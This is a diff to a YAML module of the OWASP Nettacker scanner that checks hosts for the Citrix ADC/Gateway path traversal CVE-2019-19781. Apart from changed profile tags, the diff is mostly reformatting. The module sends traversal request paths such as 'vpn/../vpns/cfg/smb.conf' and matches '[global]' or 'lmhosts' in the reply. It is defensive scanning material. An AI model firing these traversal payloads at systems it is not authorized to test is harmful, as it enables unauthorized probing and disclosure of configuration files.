@@ -2,49 +2,49 @@ info:
   name: citrix_cve_2019_19781_vuln
   author: OWASP Nettacker Team
   severity: 8
-  description: CVE-2019-19781 - Vulnerability in Citrix Application Delivery Controller, Citrix Gateway, and Citrix SD-WAN WANOP appliance
-  reference: 
-    - https://support.citrix.com/article/CTX267027
+  description: CVE-2019-19781 - Vulnerability in Citrix Application Delivery Controller,
+    Citrix Gateway, and Citrix SD-WAN WANOP appliance
+  reference:
+  - https://support.citrix.com/article/CTX267027
   profiles:
-    - vuln
-    - http
-    - high_severity
-    - cve
-    - citrix
-
+  - vuln
+  - http
+  - high_severity
+  - citrix
+  - cve_2019
 payloads:
-  - library: http
-    steps:
-      - method: get
-        timeout: 3
-        headers:
-          User-Agent: "{user_agent}"
-        allow_redirects: false
-        ssl: false
-        url:
-          nettacker_fuzzer:
-            input_format: "{{schema}}://{target}:{{ports}}/{{paths}}"
-            prefix: ""
-            suffix: ""
-            interceptors:
-            data:
-              paths:
-                - 'vpn/../vpns/cfg/smb.conf'
-                - 'vpn/../vpns/portal/scripts/newbm.pl'
-                - 'vpn/../vpns/portal/scripts/rmbm.pl'
-                - 'vpn/../vpns/portal/scripts/picktheme.pl'
-              schema:
-                - "http"
-                - "https"
-              ports:
-                - 80
-                - 443
-        response:
-          condition_type: and
-          conditions:
-            status_code:
-              regex: "200"
-              reverse: false
-            content:
-              regex: "\\[global\\]|lmhosts"
-              reverse: false
+- library: http
+  steps:
+  - method: get
+    timeout: 3
+    headers:
+      User-Agent: '{user_agent}'
+    allow_redirects: false
+    ssl: false
+    url:
+      nettacker_fuzzer:
+        input_format: '{{schema}}://{target}:{{ports}}/{{paths}}'
+        prefix: ''
+        suffix: ''
+        interceptors: null
+        data:
+          paths:
+          - vpn/../vpns/cfg/smb.conf
+          - vpn/../vpns/portal/scripts/newbm.pl
+          - vpn/../vpns/portal/scripts/rmbm.pl
+          - vpn/../vpns/portal/scripts/picktheme.pl
+          schema:
+          - http
+          - https
+          ports:
+          - 80
+          - 443
+    response:
+      condition_type: and
+      conditions:
+        status_code:
+          regex: '200'
+          reverse: false
+        content:
+          regex: \[global\]|lmhosts
+          reverse: false
